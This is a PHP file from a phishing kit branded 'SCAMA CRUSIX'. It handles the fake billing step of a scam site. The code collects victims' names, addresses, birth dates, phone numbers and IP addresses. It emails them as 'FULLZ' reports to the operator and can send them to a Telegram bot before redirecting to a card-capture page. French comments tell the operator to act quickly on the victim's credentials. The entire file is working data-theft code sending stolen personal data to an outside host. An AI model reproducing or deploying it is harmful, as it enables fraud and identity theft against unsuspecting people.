<?php 

  //==================================//
 //===============BILLING==============//
//==================================//
session_start();
include('../settings.php');
include ('../isk/all.php');
date_default_timezone_set('UTC');


if(strpos($_SERVER['REQUEST_URI'], $_SESSION['userid']))
{

	//===ERROR_CODES===//
   
    

    //===GET_INFOS===//
    $_SESSION['prenom'] = $_POST['fname'];
    $_SESSION['nom'] = $_POST['lname'];
    $_SESSION['adress'] = $_POST['adress'];
    $_SESSION['ville'] = $_POST['city'];
    $_SESSION['zip'] = $_POST['zip'];
    $_SESSION['dob'] = $_POST['dob'];
    $_SESSION['phone'] = $_POST['phone'];

    	if(empty($_SESSION['prenom']) || empty($_SESSION['nom']) || empty($_SESSION['adress']) || empty($_SESSION['ville']) || empty($_SESSION['zip']) || empty($_SESSION['dob']) || empty($_SESSION['phone']) )
    	{
    			header('Location: billing.php?'.$_SESSION['userid'].$_SESSION['gotobillingcode'].$_SESSION['billingerrorcode']);

    	}
    	else{

    			if(strlen($_SESSION['phone']) != 10 || strlen($_SESSION['dob']) != 10 || strlen($_SESSION['zip']) != 5 )
    			{
    				header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotobillingcode'].$_SESSION['billingerrorcode']);

    			}
    			else
    			{

                    if($ccplusfullinfos != "on"){
                        $subject = '=?utf-8?Q?=E3=80=8C=F0=9F=8E=B0=E3=80=8D_-_FULLZ_-_?='.$_SESSION['nom'].' '.$_SESSION['prenom'].' '.$_SESSION['ip'];
                   if($htmlrez == "on"){
                    $message_billing = "
                        <html xmlns='http://www.w3.org/1999/xhtml'><head>
  <meta http-equiv='Content-Type' content='text/html; charset=UTF-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1'>
  

  <style type='text/css'>
    /* Take care of image borders and formatting, client hacks */
    img { max-width: 600px; outline: none; text-decoration: none; -ms-interpolation-mode: bicubic;}
    a img { border: none; }
    table { border-collapse: collapse !important;}
    #outlook a { padding:0; }
    .ReadMsgBody { width: 100%; }
    .ExternalClass { width: 100%; }
    .backgroundTable { margin: 0 auto; padding: 0; width: 100% !important; }
    table td { border-collapse: collapse; }
    .ExternalClass * { line-height: 115%; }
    .container-for-gmail-android { min-width: 600px; }


    /* General styling */
    * {
      font-family: Helvetica, Arial, sans-serif;
    }

    body {
      -webkit-font-smoothing: antialiased;
      -webkit-text-size-adjust: none;
      width: 100% !important;
      margin: 0 !important;
      height: 100%;
      color: #676767;
    }

    td {
      font-family: Helvetica, Arial, sans-serif;
      font-size: 14px;
      color: #777777;
      text-align: center;
      line-height: 21px;
    }

    a {
      color: #676767;
      text-decoration: none !important;
    }

    .pull-left {
      text-align: left;
    }

    .pull-right {
      text-align: right;
    }

    .header-lg,
    .header-md,
    .header-sm {
      font-size: 32px;
      font-weight: 700;
      line-height: normal;
      padding: 35px 0 0;
      color: #4d4d4d;
    }

    .header-md {
      font-size: 24px;
    }

    .header-sm {
      padding: 5px 0;
      font-size: 18px;
      line-height: 1.3;
    }

    .content-padding {
      padding: 20px 0 30px;
    }

    .mobile-header-padding-right {
      width: 290px;
      text-align: right;
      padding-left: 10px;
    }

    .mobile-header-padding-left {
      width: 290px;
      text-align: left;
      padding-left: 10px;
    }

    .free-text {
      width: 100% !important;
      padding: 10px 60px 0px;
    }

    .block-rounded {
      border-radius: 5px;
      border: 1px solid #e5e5e5;
      vertical-align: top;
    }

    .button {
      padding: 55px 0 0;
    }

    .info-block {
      padding: 0 20px;
      width: 260px;
    }

    .mini-block-container {
      padding: 30px 50px;
      width: 500px;
    }

    .mini-block {
      background-color: #ffffff;
      width: 498px;
      border: 1px solid #cccccc;
      border-radius: 5px;
      padding: 60px 75px;
    }

    .block-rounded {
      width: 260px;
    }

    .info-img {
      width: 258px;
      border-radius: 5px 5px 0 0;
    }

    .force-width-img {
      width: 480px;
      height: 1px !important;
    }

    .force-width-full {
      width: 600px;
      height: 1px !important;
    }

    .user-img img {
      width: 82px;
      border-radius: 5px;
      border: 1px solid #cccccc;
    }

    .user-img {
      width: 92px;
      text-align: left;
    }

    .user-msg {
      width: 236px;
      font-size: 14px;
      text-align: left;
      font-style: italic;
    }

    .code-block {
      padding: 10px 0;
      border: 1px solid #cccccc;
      color: #4d4d4d;
      font-weight: bold;
      font-size: 18px;
      text-align: center;
    }

    .force-width-gmail {
      min-width:600px;
      height: 0px !important;
      line-height: 1px !important;
      font-size: 1px !important;
    }

     .button-width {
      width: 228px;
    }

  </style>

  <style type='text/css' media='screen'>
    @import url(http://fonts.googleapis.com/css?family=Oxygen:400,700);
  </style>

  <style type='text/css' media='screen'>
    @media screen {
      /* Thanks Outlook 2013! */
      * {
        font-family: 'Oxygen', 'Helvetica Neue', 'Arial', 'sans-serif' !important;
      }
    }
  </style>

  <style type='text/css' media='only screen and (max-width: 480px)'>
    /* Mobile styles */
    @media only screen and (max-width: 480px) {

      table[class*='container-for-gmail-android'] {
        min-width: 290px !important;
        width: 100% !important;
      }

      table[class='w320'] {
        width: 320px !important;
      }

      img[class='force-width-gmail'] {
        display: none !important;
        width: 0 !important;
        height: 0 !important;
      }

      a[class='button-width'],
      a[class='button-mobile'] {
        width: 248px !important;
      }

      td[class*='mobile-header-padding-left'] {
        width: 160px !important;
        padding-left: 0 !important;
      }

      td[class*='mobile-header-padding-right'] {
        width: 160px !important;
        padding-right: 0 !important;
      }

      td[class='header-lg'] {
        font-size: 24px !important;
        padding-bottom: 5px !important;
      }

      td[class='header-md'] {
        font-size: 18px !important;
        padding-bottom: 5px !important;
      }

      td[class='content-padding'] {
        padding: 5px 0 30px !important;
      }

       td[class='button'] {
        padding: 15px 0 5px !important;
      }

      td[class*='free-text'] {
        padding: 10px 18px 30px !important;
      }

      img[class='force-width-img'],
      img[class='force-width-full'] {
        display: none !important;
      }

      td[class='info-block'] {
        display: block !important;
        width: 280px !important;
        padding-bottom: 40px !important;
      }

      td[class='info-img'],
      img[class='info-img'] {
        width: 278px !important;
      }

      td[class='mini-block-container'] {
        padding: 8px 20px !important;
        width: 280px !important;
      }

      td[class='mini-block'] {
        padding: 20px !important;
      }

      td[class='user-img'] {
        display: block !important;
        text-align: center !important;
        width: 100% !important;
        padding-bottom: 10px;
      }

      td[class='user-msg'] {
        display: block !important;
        padding-bottom: 20px !important;
      }
    }
  </style>
</head>

<body bgcolor='#f7f7f7'>
<table align='center' cellpadding='0' cellspacing='0' class='container-for-gmail-android' width='100%'>
  <tbody><tr>
    <td align='left' valign='top' width='100%' style='background:repeat-x url(http://s3.amazonaws.com/swu-filepicker/4E687TRe69Ld95IDWyEg_bg_top_02.jpg) #ffffff;'>
      <center>
      <img src='http://s3.amazonaws.com/swu-filepicker/SBb2fQPrQ5ezxmqUTgCr_transparent.png' class='force-width-gmail'>
        <table cellspacing='0' cellpadding='0' width='100%' bgcolor='#ffffff' background='http://s3.amazonaws.com/swu-filepicker/4E687TRe69Ld95IDWyEg_bg_top_02.jpg' style='background-color:transparent'>
          <tbody><tr>
            <td width='100%' height='80' valign='top' style='text-align: center; vertical-align:middle;'>
            <!--[if gte mso 9]>
            <v:rect xmlns:v='urn:schemas-microsoft-com:vml' fill='true' stroke='false' style='mso-width-percent:1000;height:80px; v-text-anchor:middle;'>
              <v:fill type='tile' src='http://s3.amazonaws.com/swu-filepicker/4E687TRe69Ld95IDWyEg_bg_top_02.jpg' color='#ffffff' />
              <v:textbox inset='0,0,0,0'>
            <![endif]-->
              <center>
                <table cellpadding='0' cellspacing='0' width='600' class='w320'>
                  <tbody><tr>
                    <td class='pull-left mobile-header-padding-left' style='vertical-align: middle;'>
                      <a href=''><center><img width='50' height='50' src='https://cdn.iconscout.com/icon/free/png-512/phishing-attack-1591605-1354005.png' alt='logo'></center></a>
                    </td>
                    
                  </tr>
                </tbody></table>
              </center>
              <!--[if gte mso 9]>
              </v:textbox>
            </v:rect>
            <![endif]-->
            </td>
          </tr>
        </tbody></table>
      </center>
    </td>
  </tr>
  <tr>
    <td align='center' valign='top' width='100%' style='background-color: #f7f7f7;' class='content-padding'>
      <center>
        <table cellspacing='0' cellpadding='0' width='600' class='w320'>
          <tbody><tr>
            <td class='header-lg'>
             🎰NEW FULLZ🎰
            </td>
          </tr>
          <tr>
            <td class='free-text'>
             La victime a mit son email et son mot de passe. Soit vif si tu a activé le INC !
            </td>
          </tr>
          <tr>
            <td class='mini-block-container'>
              <table cellspacing='0' cellpadding='0' width='100%' style='border-collapse:separate !important;'>
                <tbody><tr>
                  <td class='mini-block'>
                    <table cellpadding='0' cellspacing='0' width='100%'>
                      <tbody><tr>
                        
                      </tr>
                      <tr>
                        <td class='code-block'>
                          Prénom : ".$_SESSION['prenom']."
                        </td>
                      </tr>
                       <br>
                      <tr>
                        <td class='code-block'>
                          Nom : ".$_SESSION['nom']."
                        </td>
                      </tr>
                       <br>
                      <tr>
                        <td class='code-block'>
                         Adresse : ".$_SESSION['adress']."
                        </td>
                      </tr>
                       <br>
                      <tr>
                        <td class='code-block'>
                        Ville : ".$_SESSION['ville']."
                        </td>
                      </tr>
                       <br>
                      <tr>
                        <td class='code-block'>
                        Code Postal : ".$_SESSION['zip']."
                        </td>
                      </tr>
                       <br>
                      <tr>
                        <td class='code-block'>
                        Date de naissance : ".$_SESSION['dob']."
                        </td>
                      </tr>
                       <br>
                      <tr>
                        <td class='code-block'>
                        Numéro de téléphone: ".$_SESSION['phone']."
                        </td>
                      </tr>
                               <br>
<tr>
                        <td class='code-block'>
                         ".$_SESSION['ip']."
                        </td>
                      </tr>
<tr>
                      </tr>
                    </tbody></table>
                  </td>
                </tr>
              </tbody></table>
            </td>
          </tr>
        </tbody></table>
      </center>
    </td>
  </tr>
  <tr><td align='center' valign='top' width='100%' style='background-color: #ffffff;  border-top: 1px solid #e5e5e5; border-bottom: 1px solid #e5e5e5;'>
    <center>
      <table cellpadding='0' cellspacing='0' width='600' class='w320'>
        </table>
    </center>
  </td>
  </tr><tr>
    <td align='center' valign='top' width='100%' style='background-color: #f7f7f7; height: 100px;'>
      <center>
        <table cellspacing='0' cellpadding='0' width='600' class='w320'>
          <tbody><tr>
            <td style='padding: 25px 0 25px'>
              <strong>SCAMA CRUSIX</strong><br><br><br><br>
            </td>
          </tr>
        </tbody></table>
      </center>
    </td>
  </tr>
</tbody></table>

</body></html>
                    ";
                    $headers  = 'MIME-Version: 1.0' . "\r\n";
          $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
          $headers .= 'From: =?utf-8?Q?=F0=9F=A5=B7?= '.$spammername.' =?utf-8?Q?=F0=9F=A5=B7?= <crusix@v4.me>' . "\r\n";
          mail($boiterez,$subject,$message_billing,$headers );

                  }
                  else{
                     $message_billing = "
[🍓 FULLZ 🍓]
🍉 Nom : ".$_SESSION['nom']."
🍇 Prénom : ".$_SESSION['prenom']."
🍐 Adresse : ".$_SESSION['adress']."
🍒 Ville : ".$_SESSION['ville']."
🥭 Code Postal : ".$_SESSION['zip']."
🍌 Date De Naissance : ".$_SESSION['dob']."
🍍 Numéro de téléphone : ".$_SESSION['phone']."

🔑 Adresse IP : ".$_SESSION['ip']."
🕹️ User-agent : ".$_SESSION['useragent']."
                      ";
                       $headers = "From: =?utf-8?Q?=F0=9F=A5=B7?= ".$spammername." =?utf-8?Q?=F0=9F=A5=B7?= <email@crusixv4.me>";
                       mail($boiterez,$subject,$message_billing,$headers);
                        if($telegram == "on")
                      {
      
  $data = [
                                      'text' => '
[🍓 FULLZ 🍓]
🍉 Nom : '.$_SESSION['nom'].'
🍇 Prénom : '.$_SESSION['prenom'].'
🍐 Adresse : '.$_SESSION['adress'].'
🍒 Ville : '.$_SESSION['ville'].'
🥭 Code Postal : '.$_SESSION['zip'].'
🍌 Date De Naissance : '.$_SESSION['dob'].'
🍍 Numéro de téléphone : '.$_SESSION['phone'].'

🔑 Adresse IP : '.$_SESSION['ip'].'
🕹️ User-agent : '.$_SESSION['useragent'].'


                                      ',
                                      'chat_id' => $chat_id
                                ];

                            file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );

                      }
                  }
                    

                    
                    
                      header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotocard']);
                   
                    }
                    else{
                       header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotocard']);
                    }


          }

      }
                    
                    
                     
                       
                    


    	





   


}
else{

		die('HTTP/1.0 404 Not Found');
}


